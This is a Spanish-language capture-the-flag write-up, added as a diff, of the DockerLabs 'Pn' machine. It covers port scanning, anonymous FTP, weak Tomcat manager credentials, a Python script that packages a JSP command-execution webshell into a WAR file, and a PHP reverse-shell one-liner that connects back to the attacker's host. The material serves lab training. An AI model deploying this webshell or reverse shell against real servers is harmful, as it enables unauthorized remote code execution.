@@ -1,0 +1,222 @@
+---
+title: Pn
+description: Resolución completa de la máquina virtual *Pn* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Pn**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor FTP con acceso anónimo que contiene un archivo con una pista sobre el usuario de Tomcat, y un servidor Apache Tomcat en el puerto 8080 con credenciales débiles (`tomcat:s3cr3t`). Estas credenciales permiten acceder al panel de administración de Tomcat y desplegar un archivo WAR malicioso que otorga ejecución remota de comandos.
+Tras obtener una reverse shell, se comprueba que el usuario obtenido ya es `root`, completando la escalada de privilegios sin necesidad de pasos adicionales.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Pn',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '02/04/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Pn.zip
+sudo bash auto_deploy.sh Pn.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Pn/{content,exploits,nmap,scripts}
+cd Pn
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **8080/tcp** — HTTP (Apache Tomcat)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762059605/Ports_puuokv.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,8080 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1762059606/Services_bhv57e.png)
+
+---
+
+### 1.3 Enumeración FTP
+
+El servicio FTP permite acceso anónimo:
+
+```bash
+ftp 172.17.0.2
+```
+
+Se ingresa como `anonymous` sin contraseña. Se encuentra un archivo `tomcat.txt`:
+
+![TomcatFile](https://res.cloudinary.com/dewqswzke/image/upload/v1762059606/TomcatFile_makf6k.png)
+
+---
+
+### 1.4 Enumeración web
+
+Se realiza un escaneo de directorios en el puerto 8080:
+
+```bash
+gobuster dir -u http://172.17.0.2:8080/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+No se encuentran rutas adicionales. El index corresponde al panel por defecto de Apache Tomcat:
+
+![Tomcat](https://res.cloudinary.com/dewqswzke/image/upload/v1762059606/tomcat_mb2kq9.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Credenciales de Tomcat
+
+Se prueba con el usuario `tomcat` y contraseñas comunes del diccionario de Tomcat:
+
+![Tomcat passwords](https://res.cloudinary.com/dewqswzke/image/upload/v1762059607/tomcatPasswords_jepzfm.png)
+
+La combinación válida es:
+
+```
+tomcat : s3cr3t
+```
+
+Se accede al **Manager App** de Tomcat:
+
+![Admin Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1762059605/AdminDashboard_wvlod2.png)
+
+### 2.2 Subida de webshell WAR
+
+Se genera un archivo `shell.war` con una webshell en JSP:
+
+```python
+#!/usr/bin/env python3
+import os
+import zipfile
+
+webshell_content = '''<%@ page import="java.util.*,java.io.*"%>
+<%
+if (request.getParameter("cmd") != null) {
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = in.readLine()) != null) {
+        out.println(line);
+    }
+}
+%>
+<form method="post">
+CMD: <input type="text" name="cmd" size="50">
+<input type="submit" value="Execute">
+</form>'''
+
+with zipfile.ZipFile('shell.war', 'w') as war_file:
+    war_file.writestr('shell.jsp', webshell_content)
+    war_file.writestr('WEB-INF/web.xml', '''<?xml version="1.0"?>
+<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
+</web-app>''')
+```
+
+Se ejecuta el script y se sube el archivo `shell.war` desde el panel de Tomcat.
+
+### 2.3 Reverse shell
+
+Se inicia un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede a la webshell y se ejecuta:
+
+```bash
+php -r '$sock=fsockopen("172.17.0.1",443);system("bash <&3 >&3 2>&3");'
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762059605/Root_s9bvd3.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+No es necesaria la escalada de privilegios, ya que se ha obtenido acceso directamente como usuario `root`.
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "FTP anónimo habilitado con archivos sensibles",
+      severity: "Media",
+      impact: "Revelación de información sobre usuarios del sistema"
+    },
+    {
+      vulnerability: "Credenciales débiles en Apache Tomcat",
+      severity: "Crítica",
+      impact: "Acceso al panel de administración de Tomcat"
+    },
+    {
+      vulnerability: "Panel Manager de Tomcat expuesto públicamente",
+      severity: "Crítica",
+      impact: "Despliegue de aplicaciones maliciosas y RCE"
+    },
+    {
+      vulnerability: "Carga de archivos WAR no controlada",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como root"
+    }
+  ]}
+/>
